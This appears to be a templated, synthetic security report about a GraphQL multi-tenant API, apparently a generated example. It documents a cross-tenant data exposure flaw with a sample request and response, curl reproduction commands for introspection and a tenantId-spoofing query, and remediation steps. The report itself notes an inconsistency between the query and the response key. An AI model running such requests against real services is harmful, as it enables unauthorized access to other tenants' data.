# Security Analysis Report
**System:** OreTrack Fleet Management
**Domain:** Mining / Resource Extraction
**Example ID:** GQL-0325
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Misconfiguration — Pattern 6.1 | Schema/relationship over-exposure via `listResources` — production introspection + client-controlled `tenantId` filter enables cross-tenant mining fleet data exfiltration |

---

## Finding 1 — Misconfiguration: Schema/Relationship Over-Exposure (Pattern 6.1)

### Summary
The `listResources` resolver on OreTrack Fleet Management (`api.oretrack-fleet-manag.example.com`) is over-exposed through two compounding misconfigurations: (1) GraphQL introspection is enabled in production, exposing internal type names, field descriptions, and relationship paths that aid exploitation (§5.0); (2) the `listResources` resolver accepts a client-supplied `tenantId` filter argument that is never validated against the JWT's `tenantId`. Per §5.0 Pattern 6.1, an attacker with `tenant-7fdd` credentials supplies `tenantId: "tenant-09bb"` to retrieve cross-tenant mining fleet resource records.

**Context.txt inconsistency (documented):** HAR query uses `listResources(tenantId: "tenant-09bb")`, but the response JSON key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`listResources`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of mining fleet records.

**Pattern:** 6.1 — Schema/relationship over-exposure (Misconfiguration)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.oretrack-fleet-manag.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.oretrack-fleet-manag.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-7fdd

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-09bb\") { resourceId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Mining Fleet Data Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-09bb",
      "ownerId": "other-user-7fdd09bb",
      "data": {
        "sensitiveField": "CONFIDENTIAL-7fdd09bb",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-7fdd`. Returned data belongs to: `tenant-09bb`. Cross-tenant mining fleet data exposure confirmed.

**Context.txt inconsistency:** HAR sends `listResources` query; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
# Step 1 (optional): Exploit enabled introspection to discover the tenantId filter argument
curl -s -X POST "https://api.oretrack-fleet-manag.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name args { name } } } } }"}'

# Step 2: Supply victim tenantId as filter argument
curl -s -X POST "https://api.oretrack-fleet-manag.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7fdd" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-09bb\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-09bb mining fleet data — cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. Disable GraphQL introspection in production.
2. In `listResources` resolver: derive `tenantId` exclusively from JWT claims. Remove the client-supplied `tenantId` argument or enforce that it must equal the JWT's `tenantId`.
3. Re-key Redis cache to include `tenantId`.
